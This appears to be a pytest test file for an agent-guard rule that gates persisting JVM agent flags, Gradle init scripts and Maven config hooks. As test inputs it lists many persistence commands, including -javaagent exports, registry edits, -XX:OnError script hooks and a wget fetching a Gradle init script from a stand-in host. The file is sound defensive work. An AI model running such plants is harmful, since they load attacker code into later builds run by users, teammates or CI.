"""JVM agent / build-tool exec hijack guard — blocks persisting a
`-javaagent`/`-agentpath`/`-agentlib`/`-Xbootclasspath` flag into a JVM options
variable (JAVA_TOOL_OPTIONS, MAVEN_OPTS, ...), writing a Gradle init script,
`org.gradle.jvmargs`/`org.gradle.java.home`, `.mvn/jvm.config`, or
`.mvn/extensions.xml`. Each loads attacker code into the next java/mvn/gradle
process (by this agent, a teammate or CI). Default mode `ask`, human-escapable.
"""
import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(jvm_agent={"mode": "deny"})
RULE = "jvm-agent-protect"


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _write(path, content=None):
    args = {"file_path": path}
    if content is not None:
        args["content"] = content
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write", args=args)


def _edit(path, new_string):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                      args={"file_path": path, "new_string": new_string})


def _mcp(path, content):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file",
                      action=ActionClass.MCP, args={"path": path, "content": content})


def _fires(ev, pol=EMPTY):
    d = evaluate(ev, pol)
    return d.rule == RULE


AGENT = "-javaagent:/tmp/x.jar"


@pytest.mark.parametrize("cmd", [
    f"export JAVA_TOOL_OPTIONS={AGENT}",
    f'export JAVA_TOOL_OPTIONS="{AGENT}"',
    f"export MAVEN_OPTS='-Xmx1g {AGENT}'",
    f"setx JDK_JAVA_OPTIONS {AGENT}",
    f"setenv GRADLE_OPTS {AGENT}",
    f"set -gx JAVA_OPTS -agentpath:/tmp/libx.so",
    f"declare -x _JAVA_OPTIONS={AGENT}",
    f'$env:JAVA_TOOL_OPTIONS = "{AGENT}"',
    f"echo 'JAVA_TOOL_OPTIONS={AGENT}' >> .env",
    f"echo 'export MAVEN_OPTS={AGENT}' >> build-env.sh",
    "export CATALINA_OPTS='-agentlib:jdwp=transport=dt_socket,server=y,address=5005'",
    "export SBT_OPTS=-Xbootclasspath/a:/tmp/x.jar",
    f"printf 'JAVA_OPTS={AGENT}\\n' >> Procfile",
])
def test_shell_env_plants_gated(cmd):
    assert _fires(_shell(cmd)), cmd


@pytest.mark.parametrize("cmd", [
    f"echo 'initscript {{}}' > ~/.gradle/init.gradle",
    "cp /tmp/x.gradle ~/.gradle/init.d/x.gradle",
    "echo x > ~/.gradle/init.gradle.kts",
    f"echo 'org.gradle.jvmargs=-Xmx2g {AGENT}' >> gradle.properties",
    "echo 'org.gradle.java.home=/tmp/jdk' >> ~/.gradle/gradle.properties",
    f"echo '{AGENT}' > .mvn/jvm.config",
    "echo '<extensions><extension><groupId>a</groupId></extension></extensions>' > .mvn/extensions.xml",
    f"cd .mvn && echo '{AGENT}' > jvm.config",
    "cd ~/.gradle/init.d && echo x > evil.gradle",
])
def test_shell_file_plants_gated(cmd):
    assert _fires(_shell(cmd)), cmd


@pytest.mark.parametrize("path,content", [
    ("/home/u/.gradle/init.gradle", "allprojects { }"),
    ("/home/u/.gradle/init.d/a.gradle.kts", "x"),
    ("proj/gradle.properties", f"org.gradle.jvmargs=-Xmx1g {AGENT}"),
    ("proj/gradle.properties", "org.gradle.java.home=/tmp/jdk"),
    ("proj/.mvn/jvm.config", AGENT),
    ("proj/.mvn/extensions.xml", "<extensions><extension><artifactId>x</artifactId></extension></extensions>"),
    ("proj/.env", f"JAVA_TOOL_OPTIONS={AGENT}"),
    ("proj/Dockerfile", f"ENV MAVEN_OPTS={AGENT}"),
    ("proj/docker-compose.yml", f"environment:\n  - GRADLE_OPTS={AGENT}"),
    ("proj/mise.toml", f'[env]\nJAVA_TOOL_OPTIONS = "{AGENT}"'),
    ("proj/.claude/settings.local.json", '{"env": {"JAVA_TOOL_OPTIONS": "-javaagent:/tmp/x.jar"}}'),
])
def test_edit_write_mcp_plants_gated(path, content):
    assert _fires(_write(path, content)), path
    assert _fires(_edit(path, content)), path
    assert _fires(_mcp(path, content)), path


def test_deny_mode_hard_blocks():
    d = evaluate(_shell(f"export JAVA_TOOL_OPTIONS={AGENT}"), DENY)
    assert d.rule == RULE and d.action == Action.DENY


def test_default_mode_is_ask():
    d = evaluate(_shell(f"export JAVA_TOOL_OPTIONS={AGENT}"), EMPTY)
    assert d.action == Action.ASK


@pytest.mark.parametrize("ev", [
    _shell("export JAVA_TOOL_OPTIONS=-Xmx2g"),                 # no agent flag
    _shell("export MAVEN_OPTS='-Xmx1g -Dfoo=bar'"),
    _shell(f"MAVEN_OPTS={AGENT} mvn test"),                    # inline one-shot, no persistence
    _shell("mvn -B verify"),
    _shell("cat ~/.gradle/init.gradle"),                       # read
    _shell("ls .mvn/extensions.xml"),
    _shell("echo hi > notes.txt"),
    _shell(f"grep -r MAVEN_OPTS {AGENT} . > out.txt"),         # mention, not a plant
    _shell(f"echo 'set MAVEN_OPTS to {AGENT}' > README.md"),
    _shell(f"env JAVA_TOOL_OPTIONS={AGENT} bash -c 'echo hi' > /tmp/o"),
    _write("proj/gradle.properties", "org.gradle.jvmargs=-Xmx2g"),
    _write("proj/gradle.properties", "org.gradle.daemon=true"),
    _write("proj/.mvn/jvm.config", "-Xmx1g"),
    _write("proj/.mvn/extensions.xml", "<extensions/>"),
    _write("proj/.env", "JAVA_TOOL_OPTIONS=-Xmx512m"),
    _write("proj/.env.example", "NODE_ENV=dev"),
    _write("proj/README.md", f"Set JAVA_TOOL_OPTIONS={AGENT} to attach"),   # docs, not a carrier
    _write("proj/src/Main.java", f"// JAVA_TOOL_OPTIONS {AGENT}"),
    _write("proj/build.gradle", "plugins { id 'java' }"),
    _write("proj/pom.xml", "<project/>"),
])
def test_benign_not_gated(ev):
    assert not _fires(ev)


def test_human_override_and_env(monkeypatch):
    cmd = f"export JAVA_TOOL_OPTIONS={AGENT}"
    assert not _fires(_shell(cmd + "  # aegis-allow"))
    monkeypatch.setenv("AEGIS_ALLOW_JVM_AGENT", "1")
    assert not _fires(_write("proj/.mvn/jvm.config", AGENT))
    assert not _fires(_shell(cmd))


def test_policy_allow_and_off():
    pol = Policy(jvm_agent={"allow": [r"^reviewed/"]})
    assert not _fires(_write("reviewed/.mvn/jvm.config", AGENT), pol)
    assert _fires(_write("proj/.mvn/jvm.config", AGENT), pol)
    assert not _fires(_write("proj/.mvn/jvm.config", AGENT), Policy(jvm_agent={"mode": "off"}))


def test_monitor_mode_allows_but_records():
    d = evaluate(_write("proj/.mvn/jvm.config", AGENT), Policy(jvm_agent={"mode": "monitor"}))
    assert d.action == Action.ALLOW


def test_loader_roundtrip(tmp_path):
    from aegis.loader import load_policy
    (tmp_path / "p.yaml").write_text("jvm_agent:\n  mode: deny\n")
    assert load_policy(tmp_path / "p.yaml").jvm_agent == {"mode": "deny"}
    (tmp_path / "d").mkdir()
    (tmp_path / "d" / "p.yaml").write_text("jvm_agent:\n  mode: deny\n")
    assert load_policy(tmp_path / "d").jvm_agent == {"mode": "deny"}


@pytest.mark.parametrize("ev", [
    _shell(f"echo 'export JAVA_TOOL_OPTIONS={AGENT}' >> ~/.bashrc"),
    _write("/home/u/.bashrc", f"export JAVA_TOOL_OPTIONS={AGENT}"),
    _write("proj/.envrc", f"export JAVA_TOOL_OPTIONS={AGENT}"),
])
def test_dotfile_carriers_are_gated_by_something(ev):
    # shell-profile / direnv carriers are owned by their sibling guards; the
    # JVM payload must never fall through to a plain ALLOW.
    assert evaluate(ev, EMPTY).action != Action.ALLOW


@pytest.mark.parametrize("ev", [
    _shell("export JAVA_TOOL_OPTIONS='-XX:OnError=/tmp/x.sh'"),
    _write("proj/.env", "JAVA_OPTS=-XX:OnOutOfMemoryError=/tmp/x.sh"),
    _write("proj/gradle.properties", "org.gradle.jvmargs=-Xmx1g \\\n  -javaagent:/t.jar"),
])
def test_exec_flags_and_continuations_gated(ev):
    assert _fires(ev)


def test_policy_allow_applies_to_shell():
    pol = Policy(jvm_agent={"allow": [r"jacoco"]})
    assert not _fires(_shell("export MAVEN_OPTS=-javaagent:jacoco.jar"), pol)


@pytest.mark.parametrize("cmd", [
    "cp /tmp/jvm.config .mvn/jvm.config",
    "mv /tmp/ext.xml ./.mvn/extensions.xml",
    "cat /tmp/ext.xml > .mvn/extensions.xml",
    "ln -s /tmp/evil.gradle ~/.gradle/init.gradle",
    "install -m644 e.gradle ~/.gradle/init.d/e.gradle",
    "cp x.gradle ~/.gradle/init.d/x.gradle",
    "[System.Environment]::SetEnvironmentVariable('JAVA_TOOL_OPTIONS','-javaagent:/tmp/x.jar','Machine')",
    "New-Item -Path Env:JAVA_TOOL_OPTIONS -Value '-javaagent:/tmp/x.jar'",
    "reg add HKCU\\Environment /v JAVA_TOOL_OPTIONS /d -javaagent:/tmp/x.jar",
    "echo 'MAVEN_OPTS=-javaagent:/tmp/x.jar' > ~/.mavenrc",
    "echo '-javaagent:/tmp/x.jar' >> .jvmopts",
])
def test_round2_shell_gated(cmd):
    assert _fires(_shell(cmd)), cmd


def test_round2_edit_and_padding_and_carriers():
    assert _fires(_edit("/p/.env", f"-Xmx1g {AGENT}"))
    assert _fires(_write("/p/.env", "JAVA_TOOL_OPTIONS=" + "x" * 400 + " " + AGENT))
    assert _fires(_write("/home/u/.mavenrc", f'MAVEN_OPTS="{AGENT}"'))
    assert _fires(_write("proj/.jvmopts", AGENT))


@pytest.mark.parametrize("ev", [
    _shell("rm ~/.gradle/init.gradle"),
    _write("proj/.env", f"# JAVA_TOOL_OPTIONS={AGENT}\nFOO=1"),
    _write("proj/docker/init.d/10-x.gradle", "x"),
    _write("proj/.env", "JAVA_OPTS=-Xmx1g"),
])
def test_round2_benign(ev):
    assert not _fires(ev)


@pytest.mark.parametrize("cmd", [
    "cp evil.gradle ~/.gradle/init.d/",
    "cp evil.gradle ~/.gradle/init.d",
    "mv evil.gradle ~/.gradle/init.d/",
    "install -t ~/.gradle/init.d evil.gradle",
    "cp -t ~/.gradle/init.d evil.gradle",
    "unzip x.zip -d ~/.gradle/init.d",
    "git clone https://x/y ~/.gradle/init.d",
    "wget -P ~/.gradle/init.d https://x/e.gradle",
    "cp init.gradle ~/.gradle/",
    "cp /tmp/x ~/.mavenrc",
    "cp /tmp/x .jvmopts",
])
def test_round3_shell_gated(cmd):
    assert _fires(_shell(cmd)), cmd


def test_round3_benign_and_mvnw():
    assert not _fires(_shell("ls ~/.gradle/init.d"))
    assert not _fires(_shell("cat ~/.gradle/init.d/a.gradle"))
    assert _fires(_write("proj/mvnw", f"export MAVEN_OPTS={AGENT}"))


@pytest.mark.parametrize("cmd", [
    "git add .mvn/jvm.config", "git commit -m x .mvn/extensions.xml",
    "git checkout -- .mvn/jvm.config", "git diff .mvn/extensions.xml",
])
def test_git_ops_on_jvm_files_not_gated(cmd):
    assert not _fires(_shell(cmd))
